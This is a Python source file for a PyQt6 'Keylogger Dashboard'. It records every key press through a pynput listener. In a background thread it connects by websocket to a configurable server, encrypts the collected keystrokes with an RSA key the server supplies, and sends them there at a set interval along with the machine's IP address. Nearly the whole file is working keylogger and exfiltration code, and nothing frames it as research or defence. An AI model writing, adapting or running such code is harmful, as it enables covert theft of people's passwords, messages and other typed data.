import json  # Used for working with JSON data
import threading  # Used for creating and managing threads
from pynput import keyboard  # Used for monitoring and collecting keyboard input

import socket  # Used for network communication
import requests  # Used for making HTTP requests
import subprocess  # Used for running subprocesses
import time  # Used for time-related operations
import sys  # Used for system-specific functions and variables
import asyncio
import websockets
from PyQt6.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget, QLineEdit, QFrame, QHBoxLayout, QSpinBox  # Used for creating GUI
from PyQt6.QtGui import QFont, QIcon, QColor, QPainter, QBrush, QPixmap  # Used for GUI-related elements
from PyQt6.QtCore import Qt  # Used for Qt-related functionalities
from cryptography.fernet import Fernet  # Used for encryption and decryption
from base64 import urlsafe_b64encode  # Used for encoding binary data into a URL-safe string representation
from cryptography.fernet import Fernet  # Used for encryption and decryption
import rsa  # Used for RSA encryption and decryption
import base64  # Used for encoding and decoding data

from data_collector import DataCollector  # Custom data collector module
from settings import Settings  # Custom settings module

class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()

        self.data_collector = DataCollector()
        self.settings = Settings(self.data_collector)

        self.setWindowTitle(self.settings.get_window_title())
        self.setGeometry(*self.settings.get_window_geometry())

        self.central_widget = QWidget(self)
        self.setCentralWidget(self.central_widget)

        # Create a vertical layout for the central widget
        self.layout = QVBoxLayout(self.central_widget)
        self.layout.setAlignment(Qt.AlignmentFlag.AlignTop)

        # Create a title label and set the font
        self.title_label = QLabel("Keylogger Dashboard", self)
        self.title_label.setFont(QFont("Arial", 20))
        self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)

        # Create a frame to hold the widgets
        self.frame = QFrame(self)

        # Add the title label to the layout
        self.layout.addWidget(self.title_label)

        # Add the frame to the layout
        self.layout.addWidget(self.frame)
        self.light_indicator = LightIndicator()

        # Create a horizontal layout for the frame
        frame_layout = QHBoxLayout(self.frame)

        # Add the widgets to the frame layout
        self.layout.addWidget(self.light_indicator)

        # Add spacing between the widgets
        frame_layout.setSpacing(20)

        self.hostname = socket.gethostname()
        self.IPAddr = self.get_ip_address(self.hostname)

        self.timer = None
        self.public_key = None
        self.server_path = self.settings.get_server_path()
        self.interval = self.settings.get_time_interval()

        self.setup_keylogger()

        self.setStyleSheet("background-color: #293B5F;")


    def set_server_path(self, path):
        self.server_path = path
        print(path)
        send_thread = threading.Thread(target=self.send_post_req)
        send_thread.start()

    def set_interval(self, time):
        self.interval = time

    def get_ip_address(self, hostname):
        try:
            addr_info = socket.getaddrinfo(hostname, None)
            return addr_info[5][4][0]
        except:
            return '127.0.0.1'

    def setup_keylogger(self):
        listener = keyboard.Listener(on_press=self.data_collector.collect_data)
        listener.start()

        # Start the send_post_req function in a separate thread
        send_thread = threading.Thread(target=self.send_post_req)
        send_thread.start()

    def send_post_req(self):
        asyncio.run(self.send_post_req_async())

    async def send_post_req_async(self):
        reconnect = True
        await asyncio.sleep(1)

        while reconnect:
            try:
                async with websockets.connect(self.server_path) as websocket:
                    print('restart')
                    print(self.server_path)

                    # Receive the public key from the server
                    public_key_data = await websocket.recv()
                    public_key = rsa.PublicKey.load_pkcs1(public_key_data)
                    self.light_indicator.set_active(True)

                    # Receive messages from the server
                    print(f"Received message from server: {public_key}")

                    while True:
                        message = self.data_collector.get_data()
                        encrypted_message = rsa.encrypt(message.encode(), public_key)
                        print(type(encrypted_message))
                        try:
                            await websocket.send(encrypted_message)
                            print("Encrypted message sent successfully")
                        except Exception as e:
          
                            reconnect = False

                        try:
                            await websocket.send(self.IPAddr)
                            print("IP address sent successfully")
                        except Exception as e:
                   
                            reconnect = False

                        await asyncio.sleep(self.interval)
                    

            except websockets.exceptions.ConnectionClosedError:
                print("WebSocket connection closed unexpectedly.")
                self.light_indicator.set_active(False)
                reconnect = False

            except websockets.exceptions.InvalidURI:
                print("Invalid server URL.")
                self.light_indicator.set_active(False)
                reconnect = False

            except websockets.exceptions.InvalidStatusCode:
                self.light_indicator.set_active(False)
                reconnect = False
            except:
                self.light_indicator.set_active(False)
                reconnect = False




        

                
class LightIndicator(QWidget):
    def __init__(self):
        super().__init__()
        self.active = False
        self.setMinimumSize(50, 50)
        self.setMaximumSize(50, 50)

    def set_active(self, active):
        self.active = active
        self.update()

    def paintEvent(self, event):
        # Override the paintEvent to customize the appearance of the light indicator
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        if self.active:
            painter.setBrush(QBrush(QColor(0, 255, 0)))  # Green color when active
        else:
            painter.setBrush(QBrush(QColor(255, 0, 0)))  # Red color when inactive

        painter.drawEllipse(0, 0, self.width(), self.height())


class ServerPathWidget(QWidget):
    def __init__(self, gui):
        super().__init__()
        
        self.gui = gui 

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.path_label = QLabel("Server Path:", self)
        self.path_input = QLineEdit(self)

        self.path_input.setText(gui.server_path)
        self.path_input.textChanged.connect(self.update_server_path)

        layout.addWidget(self.path_label)
        layout.addWidget(self.path_input)

    def update_server_path(self, new_path):
        self.gui.set_server_path(new_path)


class IntervalWidget(QWidget):
    def __init__(self, gui):
        super().__init__()
        
        self.gui = gui 

        layout = QVBoxLayout()
        self.setLayout(layout)

        self.interval_label = QLabel("Interval:", self)
        self.interval_spinbox = QSpinBox(self)
        self.interval_spinbox.setMinimum(1)
        self.interval_spinbox.setMaximum(9999)
        self.interval_spinbox.setValue(gui.interval)  # Set the initial value
        self.interval_spinbox.valueChanged.connect(self.update_interval)

        layout.addWidget(self.interval_label)
        layout.addWidget(self.interval_spinbox)

    def update_interval(self, value):
        self.gui.set_interval(value)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    gui = KeyloggerGUI()
    server_path_widget = ServerPathWidget(gui)
    gui.layout.addWidget(server_path_widget)
    interval_widget = IntervalWidget(gui)
    gui.layout.addWidget(interval_widget)
    gui.setAutoFillBackground(True)
    gui.show()
    sys.exit(app.exec())
